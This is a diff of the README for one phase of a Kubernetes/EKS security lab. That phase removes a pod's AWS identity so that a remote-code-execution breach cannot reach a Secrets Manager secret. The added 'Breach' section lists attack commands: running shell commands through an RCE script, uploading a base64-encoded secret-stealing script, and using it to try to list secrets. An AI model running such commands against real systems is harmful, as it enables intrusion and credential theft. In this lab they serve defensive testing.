@@ -4,15 +4,13 @@
 
 - [reat2shell: Secure EKS](#reat2shell-secure-eks)
   - [Goal](#goal)
-  - [Scope: Cloud Layer Only](#scope-cloud-layer-only)
   - [Infra Design](#infra-design)
-  - [Harden Steps](#harden-steps)
-  - [Proof](#proof)
-  - [Sidebar: Scope the Role (if the app truly needs AWS)](#sidebar-scope-the-role-if-the-app-truly-needs-aws)
+    - [Harden Steps](#harden-steps)
   - [Shift Left: Scan Terraform](#shift-left-scan-terraform)
   - [Infra provision](#infra-provision)
     - [EKS](#eks)
     - [ArgoCD](#argocd)
+  - [Breach](#breach)
 
 ---
 
@@ -20,52 +18,19 @@
 
 1. Create EKS cluster with secure cloud configurations
    - `eks-secure`
-2. Keep the cloud crown jewel — the **RDS secret in Secrets Manager** — but make
-   it **unreachable** from the cluster.
-3. Deploy the **same insecure app** via `GitOps`.
-
-- Headline fix: **remove the pod's unneeded AWS identity** (IRSA).
-- Target: the broad `*/*` role on SA `insecure-frontend:react2shell`.
-
----
-
-## Scope: Cloud Layer Only
-
-The lab hardens in four layers — **code, container, cluster, cloud**. This phase
-isolates the **cloud** layer: it assumes code, container, and cluster are **still
-compromised** and fixes AWS only.
-
-| Layer     | State in this phase         |
-| --------- | --------------------------- |
-| Code      | insecure (RCE still works)  |
-| Container | insecure (root, no seccomp) |
-| Cluster   | insecure (broad RBAC)       |
-| Cloud     | **hardened** (this phase)   |
-
-- Environment = **`eks-secure` cluster + the insecure app** (`insecure` branch,
-  `insecure-frontend`).
-- The pod can still be popped. The point: the breach is **contained at the cloud
-  boundary** — RCE yields nothing in AWS.
-
-**Least privilege, applied honestly.** The `react2shell` app makes **no AWS API
-calls** (deps: `next`, `react`, `react-dom` only — no AWS SDK). The pod's IRSA
-role only ever served the attacker's uploaded `steal_secret.js`. A workload that
-calls no AWS API needs **no AWS identity**. So the correct fix is not to _narrow_
-the role — it is to **remove it**.
-
-> The secret stays in Secrets Manager. Nothing in the cluster is granted a way to
-> reach it. If a workload _did_ legitimately need it, it would be scoped and
-> mounted — see the [sidebar](#sidebar-scope-the-role-if-the-app-truly-needs-aws).
+2. Create cloud crown jewel — the **RDSsecret in Secrets Manager**.
+3. Deploy using `GitOps`
+   - `insecure-apps-cloud`
 
 ---
 
 ## Infra Design
 
-Terraform in a single stack, mirroring phase 9 — **minus the IRSA misconfig**.
+Terraform in a single stack
 
 ```txt
 infra/
-  eks-secure/       # secure cluster + crown jewel, no pod IAM identity — remote state
+  eks-secure/       # insecure cluster + crown jewel + misconfig — remote state
 ```
 
 - **Remote state**:
@@ -82,63 +47,22 @@ infra/
 
 **Build order:** `eks-secure/`: vpc → cluster → secret
 
-**Milestone check:** `kubectl get nodes` ready; from inside the pod,
-`cat $AWS_WEB_IDENTITY_TOKEN_FILE` → **no such file** (no identity projected).
+**Milestone check:**
+
+- `kubectl get nodes` ready;
+- from inside the pod, `cat $AWS_WEB_IDENTITY_TOKEN_FILE` → **no such file** (no identity projected).
 
 ---
 
-## Harden Steps
+### Harden Steps
 
 Cut the one real cloud misconfig: the pod's broad AWS identity.
 
-| #   | Step                | What                                                               | Result                                 |
+| #   | Step                | Description                                                        | Milestone                              |
 | --- | ------------------- | ------------------------------------------------------------------ | -------------------------------------- |
 | 1   | Drop the IAM role   | Delete the `aws_iam_role.pod` + `*/*` inline policy (no `irsa.tf`) | No role for the pod to assume          |
 | 2   | Drop the SA binding | Remove `eks.amazonaws.com/role-arn` from the frontend SA (git)     | No web-identity token projected        |
 | 3   | apply + re-breach   | `terraform apply`, re-run Phase 9 attack commands                  | Breach contained at the cloud boundary |
-
-> **Note:** phase 9's IRSA _trust policy_ was already correct (`sub` pinned to the
-> one SA, `aud = sts.amazonaws.com`). The only cloud misconfig was the broad
-> `Action:* Resource:*` inline policy. Removing the whole role retires both.
-
----
-
-## Proof
-
-Same pod, same insecure app, same attacker `steal_secret.js` — only the **cloud**
-config changed. No AWS identity reaches the pod.
-
-| Action                             | Before (phase 9) | After (phase 10)           |
-| ---------------------------------- | ---------------- | -------------------------- |
-| `env \| grep AWS_ROLE_ARN`         | role ARN present | **empty** (no annotation)  |
-| `cat $AWS_WEB_IDENTITY_TOKEN_FILE` | JWT token        | **No such file**           |
-| `node /tmp/s.js` (get RDS)         | 🪙 secret        | **no credentials** — fails |
-| `node /tmp/s.js --list`            | lists secrets    | **no credentials** — fails |
-
-- RCE still lands (app unchanged), but there is **nothing to assume** — the attack
-  chain dead-ends before STS.
-- Cloud mirror of the cluster-level `403 secrets is forbidden`: the crown jewel is
-  present but unreachable from the cluster.
-
-**Milestone:** secure at cloud level.
-
----
-
-## Sidebar: Scope the Role (if the app truly needs AWS)
-
-Removing IRSA is correct **because this app calls no AWS API**. When a workload
-_does_ legitimately need a secret, least privilege means **scope, not remove**:
-
-| #   | Step               | What                                            | Result                            |
-| --- | ------------------ | ----------------------------------------------- | --------------------------------- |
-| 1   | Scope the policy   | `Action:* Resource:*` → `GetSecretValue` only   | Broad reach gone                  |
-| 2   | Reference the ARN  | `Resource = aws_secretsmanager_secret.rds.arn`  | Stays correct if secret recreated |
-| 3   | Keep trust tight   | `sub` = the one SA, `aud = sts.amazonaws.com`   | No other pod can assume the role  |
-| 4   | Mount, don't fetch | Inject via Secrets Store CSI / External Secrets | App reads a file, not the AWS API |
-
-- Then `GetSecretValue` on that ARN succeeds (app works); `--list` and every other
-  secret/service → `AccessDeniedException`.
-- This phase does **not** use this path — the app needs no AWS, so it gets none.
 
 ---
 
@@ -205,3 +129,38 @@ kubectl apply -f argocd/insecure-root-app-cloud.yaml
 ```
 
 ---
+
+## Breach
+
+- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`.
+- Exploit via `scripts/rce.py`.
+
+```sh
+# port forward
+kubectl port-forward service/react2shell -n frontend 3000:3000
+
+vi /etc/hosts
+# 127.0.0.1 react2shell-insecure.arguswatcher.net
+
+# ##############################
+# Attack
+# ##############################
+# 1. confirm RCE by id — app still vulnerable (code/container/cluster unhardened)
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
+# uid=0(root) gid=0(root) groups=0(root)
+
+# 2. look for an AWS identity — none projected (annotation removed, role gone)
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
+# (no output) — no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE
+
+# 3. upload js
+b64=$(base64 -w0 scripts/steal_secret.js)
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"
+
+# 4. try to grab the jewel — no credentials to assume any role
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
+# fails: no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
+```
+
+**Milestone:** RCE unchanged, but the cloud crown jewel is unreachable — breach
+contained at the cloud boundary.
